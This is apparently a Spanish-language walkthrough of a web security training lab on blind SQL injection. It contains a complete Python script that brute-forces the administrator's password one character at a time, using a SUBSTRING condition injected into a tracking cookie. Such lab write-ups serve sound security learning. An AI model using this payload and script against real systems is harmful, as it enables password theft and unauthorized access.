En esta última parte completamos la explotación de la inyección SQL ciega mediante la extracción carácter a carácter del campo ‘**password**‘.

Utilizamos Burp Intruder para automatizar el proceso, iterando sobre posiciones y posibles valores hasta reconstruir por completo la contraseña. Aprendes a usar funciones como ‘**SUBSTRING**‘ y a reconocer las respuestas válidas para cada intento.

Una vez extraída la contraseña, accedemos con ella como administrador para completar el laboratorio.

![Pasted image 20250702183649.png](imagenes/Pasted image 20250702183649.png)
![Pasted image 20250702184020.png](imagenes/Pasted image 20250702184020.png)
codigo llamado sqli.py
#!/usr/bin/env python3
from pwn import *
from termcolor import colored 
import requests 
import sys
import signal
import string
import time

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    p1.failure("Ataque de fuerza bruta detenido")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits 

p1 = log.progress("SQLI")

def makeSQLI():

    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters: 
            cookies = {
                'TrackingId': f"@tYdW3Ti@pJdmnVo' and (select substring(password,{position},1) from users where username='administrator')='{character}' -- ",
                'session': "xkwHU4bggBmEx0ijIEHAYx0fgb60eemG"
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("https://0afd00540433ac10815c1df5003a00c5.web-security-academy.net", cookies=cookies)

            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLI()

Resultado
![Pasted image 20250702190437.png](imagenes/Pasted image 20250702190437.png)
![Pasted image 20250702190536.png](imagenes/Pasted image 20250702190536.png)
